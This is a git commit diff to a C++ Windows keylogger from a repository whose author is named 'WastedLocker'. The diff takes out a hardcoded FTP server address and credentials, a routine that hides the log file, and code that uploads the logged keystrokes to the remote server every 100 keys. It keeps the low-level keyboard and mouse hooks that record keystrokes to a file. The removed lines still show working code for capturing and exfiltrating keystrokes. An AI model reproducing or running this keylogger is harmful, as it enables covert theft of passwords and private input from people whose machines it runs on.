2f8c39340e46c14cc1782514322ef390769993fe
WastedLocker <55410409+orbenaba@users.noreply.github.com>
2020-10-21 21:39:29 +0300

    Update Source.cpp

--- Source.cpp
+++ Source.cpp
@@ -5,11 +5,7 @@
 #include <shlobj.h>
 #include <iostream>
 
-#define SERVER_ADDRESS "82.81.103.85"
-#define PASSWORD "or"
-#define USERNAME "or"
 #define PATH "F:\\"
-
 static int keysPressed = 0; //Count the keys pressed
 using namespace std;
 
@@ -18,65 +14,11 @@ HHOOK hKeyboardHook;
 
 char* toNumber(int number)
 {
-    //[l  ,  o  ,  g, NUMBER ,  .  ,  t  ,  x  ,  t]
     char* logName = (char*)malloc(12 * sizeof(char));//7 characters are permanent, 1 is null terminator and 4 for the log number -> total: 12
     snprintf(logName, strlen(logName), "log%d.txt", number);
     return logName;
 }
 
-
-/*Change file attributes to be hidden file*/
-void hide_file(char* file)
-{
-    wchar_t wtext4[20];
-    mbstowcs(wtext4, file, strlen(file) + 1);//Plus null
-    LPCWSTR Filename = wtext4;
-    if (GetFileAttributes(Filename) != 0x22)
-        SetFileAttributes(Filename, 0x22);
-}
-
-/*Upload file to server*/
-BOOL uploadFile(char* filename, char* destination_name, char* address, char* username, char* password)
-{
-    BOOL t = false;
-    HINTERNET hint, hftp;
-    wchar_t wtext[5];
-    mbstowcs(wtext, "FTP", 3 + 1);//Plus null
-    LPWSTR FTPptr = wtext;
-    if (!(hint = InternetOpen(FTPptr, INTERNET_OPEN_TYPE_PRECONFIG, 0, 0, INTERNET_FLAG_ASYNC)))
-    {
-        cout << GetLastError();
-        return 1;
-    }
-    wchar_t wtext1[20];
-    mbstowcs(wtext1, address, strlen(address) + 1);//Plus null
-    LPWSTR Address = wtext1;
-    wchar_t wtext2[10];
-    mbstowcs(wtext2, username, strlen(username) + 1);//Plus null
-    LPWSTR Username = wtext2;
-    wchar_t wtext3[10];
-    mbstowcs(wtext3, password, strlen(password) + 1);//Plus null
-    LPWSTR Password = wtext3;
-    wchar_t wtext4[20];
-    mbstowcs(wtext4, filename, strlen(filename) + 1);//Plus null
-    LPWSTR Filename = wtext4;
-    wchar_t wtext5[20];
-    mbstowcs(wtext5, destination_name, strlen(destination_name) + 1);//Plus null
-    LPWSTR Destination_name = wtext5;
-    /*Note for me: an exception 12003 is thrown without INTERNET_FLAG_PASSIVE cause FW policies*/
-    if (!(hftp = InternetConnect(hint, Address, INTERNET_DEFAULT_FTP_PORT, Username, Password, INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0)))
-    {
-        //perror("[-] No internet connection, try later ... t(-_-t)\n");
-        cout << "1)ERROR " << GetLastError() << endl;
-        return 1;
-    }
-    if (!FtpPutFile(hftp, Filename, Destination_name, FTP_TRANSFER_TYPE_BINARY, 0))
-    {
-        cout << "2)ERROR " << GetLastError() << endl;
-        return 1;
-    }
-    return t;
-}
 // Variable to store the hook handle
 HHOOK miHook;
 // This is the hook procedure
@@ -89,9 +31,6 @@ LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam) {
     }
     return CallNextHookEx(miHook, nCode, wParam, lParam); // Important! Otherwise other mouse hooks may misbehave
 }
-
-
-
 
 LRESULT WINAPI Keylogger(int nCode, WPARAM wParam, LPARAM lParam)
 {
@@ -108,7 +47,6 @@ LRESULT WINAPI Keylogger(int nCode, WPARAM wParam, LPARAM lParam)
             cout << GetLastError();
             return 1;
         }
-
         KBDLLHOOKSTRUCT hooked_key = *((KBDLLHOOKSTRUCT*)lParam);
         DWORD dwMsg = 1;
         dwMsg += hooked_key.scanCode << 16;
@@ -122,9 +60,6 @@ LRESULT WINAPI Keylogger(int nCode, WPARAM wParam, LPARAM lParam)
         //if the key if from A-Z,a-z,0-9 then add this to file
         if (key >= 'A' && key <= 'Z')
         {
-            /*
-
-            */
             if (GetAsyncKeyState(VK_SHIFT) >= 0)//Is CAPS LOCK on?
                 key += 0x20;
             if (f != NULL)
@@ -136,22 +71,6 @@ LRESULT WINAPI Keylogger(int nCode, WPARAM wParam, LPARAM lParam)
             if (f != NULL)
                 fprintf(f, "%s", lpszKeyName);
         }
-
-        keysPressed++;
-        if (keysPressed % 100 == 0) //Enough data
-        {
-            char* logName = toNumber(keysPressed / 100);
-            fclose(f);
-            if (!uploadFile(workFullPath, logName, (char*)SERVER_ADDRESS, (char*)USERNAME, (char*)PASSWORD)) //Upload the file to FTP
-            {
-                cout << GetLastError();
-                free(logName);
-                return 1;
-            }
-            free(logName);
-        }
-
-        hide_file(workFullPath);
         fclose(f);
     }
     return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
@@ -159,11 +78,9 @@ LRESULT WINAPI Keylogger(int nCode, WPARAM wParam, LPARAM lParam)
 
 DWORD WINAPI JACKAL(LPVOID lpParm)
 {
-
     // This is how you install the hook
     // And this is how you would remove the hook again
     miHook = SetWindowsHookEx(WH_MOUSE_LL, reinterpret_cast<HOOKPROC>(&LowLevelMouseProc),NULL, 0);
-
     HINSTANCE hins;
     hins = GetModuleHandle(NULL);
     hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)Keylogger, hins, 0);
@@ -174,7 +91,6 @@ DWORD WINAPI JACKAL(LPVOID lpParm)
         DispatchMessage(&message);
     }
     UnhookWindowsHookEx(miHook);
-
     UnhookWindowsHookEx(hKeyboardHook);
     return 0;
 }
